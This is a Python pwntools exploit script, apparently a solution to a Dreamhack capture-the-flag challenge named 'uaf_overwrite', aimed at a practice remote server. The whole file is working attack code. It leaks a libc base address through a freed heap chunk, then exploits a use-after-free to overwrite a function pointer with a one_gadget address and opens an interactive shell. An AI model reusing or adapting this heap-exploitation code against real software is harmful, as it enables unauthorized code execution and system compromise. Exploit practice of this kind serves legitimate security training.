#!/usr/bin/env python3
from pwn import *

PORT =   21273
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./uaf_overwrite_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+112
        	b*human_func+9
        	b*robot_func+9
        	b*custom_func+126
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

#GDB()

def human(weight, age):
	p.sendlineafter(b"> ", b'1')
	p.sendlineafter(b"Weight: ", str(weight))
	p.sendlineafter(b"Age: ", str(age))

def robot(weight):
	p.sendlineafter(b"> ", b'2')
	p.sendlineafter(b"Weight: ", str(weight))

def custom(size, data, idx):
	p.sendlineafter(b"> ", b'3')
	p.sendlineafter(b"Size: ", str(size))
	p.sendafter(b"Data: ", data)
	p.sendlineafter(b"idx: ", str(idx))


custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)

p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Size: ", str(0x500))
p.sendafter(b"Data: ", b"BBBBBBBB")
p.recvuntil(b"BBBBBBBB")
libc.address = u64(p.recv(6) + b'\0\0') - 0x3ebca0
log.info("libc_leak: " + hex(libc.address))
p.sendlineafter(b"idx: ", str(0))

og = 0x10a41c
# GDB()
human(18, libc.address + og)
robot(18)
p.interactive()